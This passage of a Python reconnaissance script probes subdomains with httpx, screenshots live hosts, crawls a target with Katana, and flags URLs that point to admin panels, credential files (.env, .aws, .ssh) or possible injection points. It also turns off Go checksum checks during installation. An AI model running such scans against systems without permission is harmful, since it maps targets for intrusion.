        httpx_path = os.path.expanduser("~/go/bin/httpx")
        if not os.path.exists(httpx_path):
            print(f"{Colors.RED}❌ HTTPX not found at {httpx_path}{Colors.RESET}")
            return []
        print(f"{Colors.GREEN}   ✅ HTTPX found at {httpx_path}{Colors.RESET}")

        # ============ STEP 4: Scan each domain individually ============
        print(f"\n{Colors.CYAN}🚀 STEP 4: Scanning {len(all_subdomains)} domains one by one...{Colors.RESET}")
        print(f"{Colors.YELLOW}   Timeout per domain: 15 seconds{Colors.RESET}")
        print(f"{Colors.YELLOW}{'─'*70}{Colors.RESET}")

        port_string = ','.join(map(str, open_ports))
        live_hosts = set()
        all_output = []

        for idx, domain in enumerate(all_subdomains, 1):
            print(f"\n{Colors.CYAN}   [{idx}/{len(all_subdomains)}] Scanning: {domain}{Colors.RESET}")
            
            # Build httpx command for single domain
            cmd = (
                f"{httpx_path} -u {domain} "
                f"-follow-redirects -follow-host-redirects -max-redirects 5 "
                f"-ports {port_string} -probe -timeout 8 -retries 0 -threads 1 "
                f"-title -tech-detect -server -ip -cdn -tls-probe -tls-grab"
            )
            if self.use_proxy:
                cmd = f"{self.proxy_prefix} {cmd}"

            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                output = result.stdout + result.stderr
                all_output.append(f"=== {domain} ===\n{output}\n")

                # Check if live
                if 'SUCCESS' in output and domain in output:
                    live_hosts.add(domain)
                    print(f"{Colors.GREEN}      ✅ LIVE: {domain}{Colors.RESET}")
                    # Show first line of output
                    for line in output.split('\n')[:2]:
                        if line.strip():
                            print(f"      {line}")
                else:
                    print(f"{Colors.YELLOW}      ❌ Not live or no response{Colors.RESET}")

            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}      ⏱️ Timeout for {domain}{Colors.RESET}")
                all_output.append(f"=== {domain} ===\nTIMEOUT\n")
            except Exception as e:
                print(f"{Colors.RED}      ❌ Error: {e}{Colors.RESET}")
                all_output.append(f"=== {domain} ===\nERROR: {e}\n")

            time.sleep(0.3)  # small delay

        # ============ STEP 5: Save results ============
        print(f"\n{Colors.CYAN}📁 STEP 5: Saving results...{Colors.RESET}")
        with open(f"{self.results_dir}/httpx_all.txt", 'w') as f:
            f.write('\n'.join(all_output))

        self.live_hosts = sorted(list(live_hosts))
        if self.live_hosts:
            print(f"{Colors.GREEN}✅ Total live hosts found: {len(self.live_hosts)}{Colors.RESET}")
            with open(f"{self.results_dir}/live_hosts_list.txt", 'w') as f:
                for host in self.live_hosts:
                    f.write(f"https://{host}\n")
            print(f"{Colors.CYAN}📁 Live hosts saved to {self.results_dir}/live_hosts_list.txt{Colors.RESET}")
        else:
            print(f"{Colors.RED}❌ No live hosts found.{Colors.RESET}")

        return self.live_hosts



        
    # ==================== GOWITNESS ====================
    def run_gowitness_all(self):
        """Run Gowitness - Fully Automated with Headless Chromium"""
        print(f"\n{Colors.CYAN}📸 SCREENSHOTS - HEADLESS CHROMIUM (AUTO-INSTALL){Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        if not self.live_hosts:
            print(f"{Colors.YELLOW}⚠️ No live hosts found{Colors.RESET}")
            return

        # ============ STEP 1: Install dependencies automatically ============
        print(f"{Colors.CYAN}📦 Installing dependencies...{Colors.RESET}")
        
        # 1.1 Install Chromium if not installed
        try:
            subprocess.run(['chromium', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✅ Chromium is installed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Installing Chromium...{Colors.RESET}")
            subprocess.run("sudo apt update -y", shell=True, check=False)
            subprocess.run("sudo apt install chromium -y", shell=True, check=False)
            print(f"{Colors.GREEN}✅ Chromium installed{Colors.RESET}")

        # 1.2 Install xvfb (for headless display)
        try:
            subprocess.run(['xvfb-run', '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✅ xvfb is installed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Installing xvfb...{Colors.RESET}")
            subprocess.run("sudo apt install xvfb -y", shell=True, check=False)
            print(f"{Colors.GREEN}✅ xvfb installed{Colors.RESET}")

        # 1.3 Check if chromium works with headless
        print(f"{Colors.CYAN}🔍 Testing Chromium headless...{Colors.RESET}")
        test_cmd = "chromium --headless --disable-gpu --screenshot=/tmp/test.png https://google.com 2>/dev/null"
        try:
            result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0 and os.path.exists("/tmp/test.png"):
                print(f"{Colors.GREEN}✅ Chromium headless is working{Colors.RESET}")
                os.remove("/tmp/test.png")
            else:
                print(f"{Colors.YELLOW}⚠️ Chromium headless test failed{Colors.RESET}")
        except:
            print(f"{Colors.YELLOW}⚠️ Chromium headless test failed{Colors.RESET}")

        # ============ STEP 2: Take screenshots ============
        # Create screenshot directory inside main results folder
        screenshot_dir = f"{self.results_dir}/screenshots"
        os.makedirs(screenshot_dir, exist_ok=True)

        print(f"\n{Colors.CYAN}📸 Taking screenshots with Headless Chromium...{Colors.RESET}")
        print(f"{Colors.YELLOW}   Total live hosts: {len(self.live_hosts)}{Colors.RESET}")
        print(f"{Colors.YELLOW}   📁 Saving to: {screenshot_dir}{Colors.RESET}")

        success_count = 0
        failed_count = 0
        skipped_count = 0

        for i, host in enumerate(self.live_hosts, 1):
            # Clean host
            host = host.strip()
            host = re.sub(r'^https?://', '', host)
            host = host.split(':')[0]
            
            # Skip invalid hosts
            if not host or '.' not in host:
                skipped_count += 1
                continue

            # Create safe filename
            safe_name = re.sub(r'[^a-zA-Z0-9]', '_', host)
            output_file = f"{screenshot_dir}/{safe_name}.png"
            
            print(f"{Colors.CYAN}📸 [{i}/{len(self.live_hosts)}] {host}{Colors.RESET}")

            # ============ Take screenshot with headless chromium ============
            cmd = (f"chromium --headless --disable-gpu "
                   f"--screenshot={output_file} "
                   f"--window-size=1920,1080 "
                   f"--timeout=30000 "
                   f"https://{host} 2>/dev/null")

            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
                if result.returncode == 0 and os.path.exists(output_file):
                    file_size = os.path.getsize(output_file)
                    if file_size > 1000:  # Valid screenshot
                        success_count += 1
                        print(f"{Colors.GREEN}   ✅ Saved ({file_size//1024}KB){Colors.RESET}")
                    else:
                        failed_count += 1
                        print(f"{Colors.YELLOW}   ⚠️ Empty screenshot (removing){Colors.RESET}")
                        if os.path.exists(output_file):
                            os.remove(output_file)
                else:
                    failed_count += 1
                    print(f"{Colors.RED}   ❌ Failed{Colors.RESET}")
            except subprocess.TimeoutExpired:
                failed_count += 1
                print(f"{Colors.RED}   ❌ Timeout{Colors.RESET}")
            except Exception as e:
                failed_count += 1
                print(f"{Colors.RED}   ❌ Error: {str(e)[:50]}{Colors.RESET}")

            # Small delay to avoid rate limiting
            time.sleep(0.5)

        # ============ STEP 3: Summary ============
        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 SCREENSHOT SUMMARY{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Results Directory: {self.results_dir}{Colors.RESET}")
        print(f"{Colors.CYAN}📸 Screenshot Folder: {screenshot_dir}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Success: {success_count}{Colors.RESET}")
        print(f"{Colors.RED}❌ Failed: {failed_count}{Colors.RESET}")
        print(f"{Colors.YELLOW}⏭️ Skipped: {skipped_count}{Colors.RESET}")

        # Show saved files
        if os.path.exists(screenshot_dir):
            screenshots = [f for f in os.listdir(screenshot_dir) if f.endswith('.png')]
            if screenshots:
                print(f"\n{Colors.CYAN}📋 Screenshots saved:{Colors.RESET}")
                for sc in screenshots[:10]:
                    size = os.path.getsize(f"{screenshot_dir}/{sc}")
                    print(f"{Colors.BLUE}   - {sc} ({size//1024}KB){Colors.RESET}")
                if len(screenshots) > 10:
                    print(f"{Colors.YELLOW}   ... and {len(screenshots)-10} more{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}⚠️ No valid screenshots saved{Colors.RESET}")

    # ==================== KATANA ====================
    # ==================== KATANA ====================
    # ==================== KATANA ====================
    def run_katana_all(self):
        """Katana - ALL OPTIONS with 2min Timeout (Proxy Disabled)"""
        print(f"\n{Colors.CYAN}🔍 KATANA - URL DISCOVERY (ALL OPTIONS){Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        # STEP 1: Check Katana
        if not self.check_go_katana():
            print(f"{Colors.RED}❌ Katana not available{Colors.RESET}")
            return

        # STEP 2: Test connection
        print(f"\n{Colors.CYAN}📡 Testing connection...{Colors.RESET}")
        protocol = self.test_connection_for_katana()
        
        if protocol == 'https':
            protocols = ['https']
        elif protocol == 'http':
            protocols = ['http']
        else:
            protocols = ['https', 'http']

        # Get katana path
        katana_cmd = self.get_katana_path()

        # ================================================================
        # OPTIMIZED CONFIGS - Valid flags only
        # ================================================================
        test_configs = [
            {
                'name': '01_basic',
                'desc': 'Basic crawl',
                'options': f'-silent -c 5 -d 1 -timeout 5'
            },
            {
                'name': '02_depth2',
                'desc': 'Depth 2 crawl',
                'options': f'-silent -c 5 -d 2 -timeout 5'
            },
            {
                'name': '03_retry',
                'desc': 'With retry',
                'options': f'-silent -c 5 -d 2 -timeout 5 -retry 2'
            },
            {
                'name': '04_known',
                'desc': 'Known files (robots, sitemap)',
                'options': f'-silent -c 5 -d 2 -timeout 5 -retry 2 -known-files all'
            },
            {
                'name': '05_headless',
                'desc': 'Headless (JavaScript)',
                'options': f'-silent -c 5 -d 1 -timeout 8 -retry 1 -headless'
            },
            {
                'name': '06_js',
                'desc': 'JavaScript extraction',
                'options': f'-silent -c 5 -d 1 -timeout 8 -retry 1 -headless -j'
            },
            {
                'name': '07_filter',
                'desc': 'Filter extensions',
                'options': f'-silent -c 5 -d 2 -timeout 5 -retry 1 -ef js,css,png,ico,jpg,svg,woff,ttf'
            },
            {
                'name': '08_include',
                'desc': 'Include only php,html',
                'options': f'-silent -c 5 -d 2 -timeout 5 -retry 1 -if php,html -ef js,css,png,ico,jpg,svg,woff,ttf'
            },
            {
                'name': '09_exclude',
                'desc': 'Exclude images and css',
                'options': f'-silent -c 5 -d 2 -timeout 5 -retry 1 -ef png,jpg,jpeg,gif,svg,ico,css'
            },
            {
                'name': '10_nofilter',
                'desc': 'No filter - all URLs',
                'options': f'-silent -c 5 -d 2 -timeout 5 -retry 1'
            },
            {
                'name': '11_json',
                'desc': 'JSON output',
                'options': f'-silent -c 5 -d 1 -timeout 5 -retry 1 -json'
            },
            {
                'name': '12_verbose',
                'desc': 'Verbose mode',
                'options': f'-c 5 -d 1 -timeout 5 -retry 1 -v'
            },
            {
                'name': '13_headless_json',
                'desc': 'Headless + JSON',
                'options': f'-silent -c 5 -d 1 -timeout 8 -retry 1 -headless -json'
            },
            {
                'name': '14_all',
                'desc': 'All features except headless',
                'options': f'-silent -c 10 -d 2 -timeout 5 -retry 2 -known-files all -json -j'
            },
            {
                'name': '15_full',
                'desc': 'FULL SCAN - all features',
                'options': f'-c 20 -d 2 -timeout 8 -retry 3 -headless -j -known-files all -json'
            }
        ]

        # STEP 4: Run scans
        print(f"\n{Colors.CYAN}🚀 Starting 15 Katana scans...{Colors.RESET}")
        print(f"{Colors.YELLOW}💡 Per-test timeout: 120 seconds{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")
        
        successful = 0
        total = 0
        all_urls = []
        results = []

        for protocol in protocols:
            for config in test_configs:
                total += 1
                output_file = f"{self.results_dir}/katana_{config['name']}.txt"
                
                print(f"\n{Colors.CYAN}📝 [{total}/15] {config['desc']}{Colors.RESET}")
                print(f"{Colors.BLUE}   Options: {config['options']}{Colors.RESET}")
                
                cmd = (f"{katana_cmd} -u {protocol}://{self.clean_target} "
                       f"-o {output_file} "
                       f"{config['options']}")
                
                print(f"{Colors.GREEN}🔓 Proxy: DISABLED{Colors.RESET}")
                print(f"{Colors.YELLOW}⏱️  Timeout: 120s{Colors.RESET}")
                
                start_time = time.time()
                found = self.run_katana_with_timeout(cmd, output_file, total, 15)
                elapsed = time.time() - start_time
                
                url_count = len(found) if found else 0
                
                if found is not None:
                    successful += 1
                    print(f"{Colors.GREEN}✅ Test {total} PASSED - {url_count} URLs{Colors.RESET}")
                    if found:
                        all_urls.extend(found)
                        self.urls.extend(found)
                else:
                    if elapsed >= 120:
                        print(f"{Colors.YELLOW}⏱️ Test {total} TIMEOUT{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}❌ Test {total} FAILED{Colors.RESET}")
                
                results.append({
                    'num': total,
                    'name': config['name'],
                    'desc': config['desc'],
                    'status': '✅ PASS' if found is not None else ('⏱️ TIMEOUT' if elapsed >= 120 else '❌ FAIL'),
                    'urls': url_count,
                    'time': f"{elapsed:.1f}s"
                })
                
                time.sleep(0.5)

        # STEP 5: Summary
        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 KATANA SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}Total tests: {total}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Passed: {successful}{Colors.RESET}")
        timeout_count = sum(1 for r in results if 'TIMEOUT' in r['status'])
        fail_count = sum(1 for r in results if 'FAIL' in r['status'])
        print(f"{Colors.YELLOW}⏱️  Timeout: {timeout_count}{Colors.RESET}")
        print(f"{Colors.RED}❌ Failed: {fail_count}{Colors.RESET}")
        print(f"{Colors.CYAN}Total unique URLs: {len(set(all_urls))}{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Results: {self.results_dir}{Colors.RESET}")
        print(f"{Colors.GREEN}🔓 Proxy: DISABLED{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        # Detailed table
        print(f"\n{Colors.BOLD}📋 DETAILED RESULTS:{Colors.RESET}")
        print(f"{Colors.YELLOW}{'─'*100}{Colors.RESET}")
        print(f"{Colors.BLUE}{'#':<4} {'Config':<15} {'Status':<12} {'URLs':<8} {'Time':<8} {'Description':<40}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'─'*100}{Colors.RESET}")
        for r in results:
            if 'PASS' in r['status']:
                status_color = Colors.GREEN
            elif 'TIMEOUT' in r['status']:
                status_color = Colors.YELLOW
            else:
                status_color = Colors.RED
            print(f"{r['num']:<4} {r['name']:<15} {status_color}{r['status']:<12}{Colors.RESET} {r['urls']:<8} {r['time']:<8} {r['desc']:<40}")
        print(f"{Colors.YELLOW}{'─'*100}{Colors.RESET}")

        # Save all URLs
        if all_urls:
            all_urls = list(set(all_urls))
            with open(f"{self.results_dir}/katana_all_urls.txt", 'w') as f:
                for url in sorted(all_urls):
                    f.write(f"{url}\n")
            print(f"\n{Colors.CYAN}📁 All URLs saved: {self.results_dir}/katana_all_urls.txt{Colors.RESET}")

    def run_katana_with_timeout(self, cmd, output_file, test_num, total_tests):
        """Run Katana with 120 second timeout"""
        print(f"{Colors.CYAN}▶️ [{test_num}/{total_tests}] Running...{Colors.RESET}")
        print(f"{Colors.YELLOW}   CMD: {cmd[:150]}...{Colors.RESET}")
        print(f"{Colors.BLUE}{'─'*70}{Colors.RESET}")
        
        found_urls = []
        process = None
        timed_out = False
        start_time = time.time()
        
        # Static files to filter
        static_exts = ['.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.ttf', '.mp4', '.mp3', '.webp', '.avif']
        trackers = ['analytics', 'tracking', 'adservice', 'doubleclick', 'googletag', 'cdn', 'adobedtm', 'rubiconproject', 'cookielaw', 'securepubads']
        
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            last_update = time.time()
            url_count = 0
            
            while True:
                if process.poll() is not None:
                    break
                
                try:
                    import select
                    ready = select.select([process.stdout], [], [], 1.0)
                    if ready[0]:
                        line = process.stdout.readline()
                        if line:
                            line = line.rstrip()
                            if line:
                                if 'http://' in line or 'https://' in line:
                                    skip = False
                                    line_lower = line.lower()
                                    for ext in static_exts:
                                        if ext in line_lower:
                                            skip = True
                                            break
                                    if not skip:
                                        for t in trackers:
                                            if t in line_lower:
                                                skip = True
                                                break
                                    
                                    if not skip:
                                        urls = re.findall(r'https?://[^\s]+', line)
                                        for url in urls:
                                            if url not in found_urls:
                                                found_urls.append(url)
                                        
                                        url_count = len(found_urls)
                                        current_time = time.time()
                                        if current_time - last_update >= 3:
                                            print(f"{Colors.CYAN}   📊 Found {url_count} URLs...{Colors.RESET}")
                                            last_update = current_time
                                        
                                        if url_count <= 10:
                                            print(f"{Colors.GREEN}   🟢 {line}{Colors.RESET}")
                                        elif url_count == 11:
                                            print(f"{Colors.YELLOW}   📊 More URLs found...{Colors.RESET}")
                                elif 'ERROR' in line or 'error' in line.lower():
                                    if 'timeout' not in line.lower():
                                        print(f"{Colors.RED}   ❌ {line}{Colors.RESET}")
                                elif 'WARNING' in line or 'warning' in line.lower():
                                    if 'timeout' not in line.lower():
                                        print(f"{Colors.YELLOW}   ⚠️ {line}{Colors.RESET}")
                    else:
                        elapsed = time.time() - start_time
                        if elapsed > 120:
                            timed_out = True
                            print(f"{Colors.YELLOW}⏱️ Test timeout (120s) - Skipping...{Colors.RESET}")
                            process.kill()
                            process.wait()
                            break
                except:
                    break
            
            if process and process.poll() is None:
                process.kill()
                process.wait()
            
            elapsed = time.time() - start_time
            
            if timed_out:
                print(f"\n{Colors.YELLOW}⏱️ TIMEOUT after {elapsed:.1f}s{Colors.RESET}")
                print(f"{Colors.CYAN}📊 Found {len(found_urls)} URLs{Colors.RESET}")
                if found_urls:
                    with open(output_file, 'w') as f:
                        for url in found_urls:
                            f.write(f"{url}\n")
                    print(f"{Colors.GREEN}✅ Partial results saved{Colors.RESET}")
                return found_urls if found_urls else None
            
            print(f"\n{Colors.CYAN}📊 Completed in {elapsed:.1f}s{Colors.RESET}")
            print(f"{Colors.CYAN}📊 Total URLs: {len(found_urls)}{Colors.RESET}")
            
            if found_urls:
                with open(output_file, 'w') as f:
                    for url in found_urls:
                        f.write(f"{url}\n")
                print(f"{Colors.GREEN}✅ Saved: {output_file}{Colors.RESET}")
            
            if process.returncode == 0:
                print(f"{Colors.GREEN}✅ Done{Colors.RESET}")
                return found_urls
            else:
                return found_urls if found_urls else None
                
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {str(e)[:100]}{Colors.RESET}")
            if process and process.poll() is None:
                process.kill()
                process.wait()
            return None
    def get_katana_path(self):
        """Get full path to katana"""
        try:
            result = subprocess.run(['which', 'katana'], capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except:
            pass
        
        katana_path = os.path.expanduser("~/go/bin/katana")
        if os.path.exists(katana_path):
            return katana_path
        
        return "katana"

    def check_go_katana(self):
        """Check if Katana is installed via Go"""
        print(f"{Colors.CYAN}🔍 Checking Katana installation...{Colors.RESET}")
        
        try:
            subprocess.run(['katana', '-version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✅ Katana is installed{Colors.RESET}")
            return True
        except:
            pass
        
        # Check in ~/go/bin
        katana_path = os.path.expanduser("~/go/bin/katana")
        if os.path.exists(katana_path):
            print(f"{Colors.GREEN}✅ Katana found at {katana_path}{Colors.RESET}")
            go_bin = os.path.expanduser("~/go/bin")
            if go_bin not in os.environ['PATH']:
                os.environ['PATH'] = go_bin + os.pathsep + os.environ['PATH']
            return True
        
        print(f"{Colors.YELLOW}⚠️ Katana not found. Installing via Go...{Colors.RESET}")
        try:
            install_cmd = "go env -w GOPROXY=direct && go env -w GOSUMDB=off && go install github.com/projectdiscovery/katana/cmd/katana@latest"
            result = subprocess.run(install_cmd, shell=True, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ Katana installed successfully{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}❌ Katana installation failed{Colors.RESET}")
                if result.stderr:
                    print(f"{Colors.RED}   Error: {result.stderr[:200]}{Colors.RESET}")
                return False
        except Exception as e:
            print(f"{Colors.RED}❌ Error installing Katana: {str(e)[:100]}{Colors.RESET}")
            return False

    def test_connection_for_katana(self):
        """Test connection and determine protocol for Katana"""
        try:
            import requests
            try:
                response = requests.get(f"http://{self.clean_target}", timeout=10, allow_redirects=False)
                if response.status_code in [301, 302, 307, 308]:
                    print(f"{Colors.YELLOW}⚠️ HTTP redirects to HTTPS{Colors.RESET}")
                    if 'Location' in response.headers:
                        print(f"{Colors.BLUE}   Redirect Location: {response.headers['Location']}{Colors.RESET}")
                    return 'https'
                elif response.status_code == 200:
                    print(f"{Colors.GREEN}✅ HTTP works directly{Colors.RESET}")
                    return 'http'
            except:
                pass
            
            try:
                response = requests.get(f"https://{self.clean_target}", timeout=10)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}✅ HTTPS works{Colors.RESET}")
                    return 'https'
            except:
                pass
            
            print(f"{Colors.YELLOW}⚠️ Could not determine protocol, trying both{Colors.RESET}")
            return 'both'
        except:
            return 'both'

    
    # ==================== URL DEEP ANALYSIS & VULNERABILITY SCANNER ====================
    def analyze_urls_deep(self):
        """Deep analysis of discovered URLs - Find sensitive endpoints, patterns, and vulnerabilities"""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🔍 URL DEEP ANALYSIS - VULNERABILITY & SENSITIVE DATA DISCOVERY{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        # ============ Load URLs from files ============
        all_urls = []
        url_files = ['katana_all_urls.txt', 'httpx_all.txt', 'webdork_results.txt']
        
        for url_file in url_files:
            file_path = f"{self.results_dir}/{url_file}"
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        url = line.strip()
                        if url and url not in all_urls:
                            all_urls.append(url)
        
        if not all_urls:
            print(f"{Colors.RED}❌ No URLs found to analyze{Colors.RESET}")
            return
        
        print(f"{Colors.CYAN}📊 Total URLs to analyze: {len(all_urls)}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")

        # ============ Categorize URLs ============
        categories = {
            'admin_panels': [],
            'sensitive_files': [],
            'api_endpoints': [],
            'upload_endpoints': [],
            'config_files': [],
            'backup_files': [],
            'login_pages': [],
            'database_files': [],
            'log_files': [],
            'debug_pages': [],
            'git_repos': [],
            'env_files': [],
            'php_info': [],
            'server_status': [],
            'xml_sitemap': [],
            'robots_txt': [],
            'crossdomain': [],
            'graphql': [],
            'swagger': [],
            'wordpress': [],
            'joomla': [],
            'drupal': [],
            'cms': [],
            'ecommerce': [],
            'payment': [],
            'user_data': [],
            'admin_actions': [],
            'parameters': [],
            'potential_idor': [],
            'potential_sqli': [],
            'potential_xss': [],
            'potential_lfi': [],
            'potential_rfi': [],
            'potential_rce': [],
            'potential_ssrf': [],
            'potential_ssti': [],
            'development': [],
            'staging': [],
            'test': [],
            'backup_dirs': [],
            'temp_dirs': [],
            'cache': [],
            'assets': [],
            'images': [],
            'videos': [],
            'downloads': [],
            'reports': [],
            'exports': [],
            'unknown': []
        }

        # ============ Pattern matching ============
        patterns = {
            'admin_panels': [r'/admin', r'/administrator', r'/wp-admin', r'/dashboard', r'/control', r'/manage', r'/panel'],
            'sensitive_files': [r'\.env', r'\.git', r'\.htaccess', r'\.htpasswd', r'web\.config', r'\.aws', r'\.ssh'],
            'api_endpoints': [r'/api/', r'/rest/', r'/graphql', r'/soap', r'/v[0-9]/', r'/endpoint'],
            'upload_endpoints': [r'/upload', r'/uploads', r'/file', r'/files', r'/media', r'/images'],
            'config_files': [r'config\.', r'\.conf', r'settings\.', r'\.yml', r'\.yaml', r'\.json'],
            'backup_files': [r'backup', r'\.bak', r'\.old', r'\.tmp', r'\.swp'],
            'login_pages': [r'/login', r'/signin', r'/auth', r'/authenticate', r'/logon'],
            'database_files': [r'\.sql', r'\.db', r'database', r'mysql', r'postgres', r'mongodb'],
            'log_files': [r'/log', r'/logs', r'/debug', r'/trace', r'\.log'],
            'debug_pages': [r'/debug', r'/test', r'/dev', r'/phpinfo', r'/info\.php'],
            'git_repos': [r'/\.git', r'/git/', r'/repository'],
            'env_files': [r'\.env', r'environment', r'\.env\.'],
            'php_info': [r'phpinfo', r'info\.php', r'php\.ini'],
            'server_status': [r'/server-status', r'/status', r'/health', r'/ping'],
            'xml_sitemap': [r'sitemap\.xml', r'sitemap\.', r'\.xml'],
            'robots_txt': [r'robots\.txt'],
            'crossdomain': [r'crossdomain\.xml', r'clientaccesspolicy\.xml'],
            'graphql': [r'/graphql', r'/gql', r'/query'],
            'swagger': [r'swagger', r'api-docs', r'openapi'],
            'wordpress': [r'/wp-', r'/wp-content', r'/wp-includes', r'/wp-admin'],
            'joomla': [r'/administrator', r'/components/', r'/modules/', r'/plugins/'],
            'drupal': [r'/sites/', r'/modules/', r'/themes/', r'/profiles/'],
            'cms': [r'/cms', r'/content', r'/editor', r'/publish'],
            'ecommerce': [r'/shop', r'/store', r'/cart', r'/checkout', r'/payment', r'/product'],
            'payment': [r'/pay', r'/payment', r'/billing', r'/invoice', r'/order'],
            'user_data': [r'/user', r'/users', r'/profile', r'/account', r'/member'],
            'admin_actions': [r'/delete', r'/edit', r'/update', r'/remove', r'/create', r'/add', r'/modify'],
            'development': [r'/dev', r'/development', r'/staging', r'/stage', r'/test', r'/testing'],
            'backup_dirs': [r'/backup', r'/backups', r'/temp', r'/tmp', r'/cache'],
            'reports': [r'/report', r'/reports', r'/export', r'/exports'],
            'downloads': [r'/download', r'/downloads', r'/files', r'/assets']
        }

        # ============ Analyze each URL ============
        print(f"\n{Colors.CYAN}🔍 Analyzing URLs for patterns and vulnerabilities...{Colors.RESET}")
        
        for url in all_urls:
            url_lower = url.lower()
            categorized = False
            
            for category, pattern_list in patterns.items():
                for pattern in pattern_list:
                    if re.search(pattern, url_lower):
                        if category in categories:
                            categories[category].append(url)
                            categorized = True
                            break
                if categorized:
                    break
            
            if not categorized:
                # Check for parameters
                if '?' in url:
                    categories['parameters'].append(url)
                    # Check for potential IDOR
                    if re.search(r'id=\d+|user=\d+|uid=\d+|item=\d+', url_lower):
                        categories['potential_idor'].append(url)
                    # Check for potential SQLi
                    if re.search(r'q=|query=|search=|filter=|sort=|order=', url_lower):
                        categories['potential_sqli'].append(url)
                    # Check for potential XSS
                    if re.search(r'return=|callback=|redirect=|next=|url=', url_lower):
                        categories['potential_xss'].append(url)
                    # Check for potential LFI/RFI
                    if re.search(r'file=|path=|dir=|page=|view=|include=', url_lower):
                        categories['potential_lfi'].append(url)
                else:
                    categories['unknown'].append(url)

        # ============ Display Results ============
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 URL ANALYSIS RESULTS{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        # Critical findings first
        critical_categories = [
            ('🔴 ADMIN PANELS', 'admin_panels'),
            ('🔴 SENSITIVE FILES (.env, .git, .htaccess)', 'sensitive_files'),
            ('🔴 CONFIG FILES', 'config_files'),
            ('🔴 DATABASE FILES', 'database_files'),
            ('🔴 BACKUP FILES', 'backup_files'),
            ('🔴 GIT REPOSITORIES', 'git_repos'),
            ('🔴 ENV FILES', 'env_files'),
            ('🔴 PHP INFO', 'php_info'),
            ('🔴 SERVER STATUS', 'server_status'),
            ('🔴 LOG FILES', 'log_files'),
            ('🔴 DEBUG PAGES', 'debug_pages'),
            ('🟠 API ENDPOINTS', 'api_endpoints'),
            ('🟠 UPLOAD ENDPOINTS', 'upload_endpoints'),
            ('🟠 LOGIN PAGES', 'login_pages'),
            ('🟠 ADMIN ACTIONS', 'admin_actions'),
            ('🟠 USER DATA', 'user_data'),
            ('🟠 PAYMENT/ORDERS', 'payment'),
            ('🟠 ECOMMERCE', 'ecommerce'),
            ('🟡 PARAMETERS', 'parameters'),
            ('🟡 POTENTIAL IDOR', 'potential_idor'),
            ('🟡 POTENTIAL SQL INJECTION', 'potential_sqli'),
            ('🟡 POTENTIAL XSS', 'potential_xss'),
            ('🟡 POTENTIAL LFI/RFI', 'potential_lfi'),
            ('🟢 CMS (WordPress, Joomla, Drupal)', 'cms'),
            ('🟢 DEVELOPMENT/STAGING', 'development'),
            ('🟢 BACKUP DIRS', 'backup_dirs'),
            ('🟢 REPORTS/EXPORTS', 'reports'),
            ('🟢 DOWNLOADS', 'downloads'),
            ('⚪ UNKNOWN', 'unknown')
        ]

        total_found = 0
        for display_name, category in critical_categories:
            if categories[category]:
                count = len(categories[category])
                total_found += count
                print(f"\n{Colors.BOLD}{display_name} ({count}){Colors.RESET}")
                for url in categories[category][:10]:
                    print(f"   - {url}")
                if count > 10:
                    print(f"   ... and {count-10} more")

        # ============ Save detailed report ============
        report_file = f"{self.results_dir}/url_deep_analysis.txt"
        with open(report_file, 'w') as f:
            f.write("="*70 + "\n")
            f.write("URL DEEP ANALYSIS REPORT\n")
            f.write("="*70 + "\n")
            f.write(f"Target: {self.clean_target}\n")
            f.write(f"Total URLs Analyzed: {len(all_urls)}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
            
            for display_name, category in critical_categories:
                if categories[category]:
                    f.write(f"\n{display_name} ({len(categories[category])})\n")
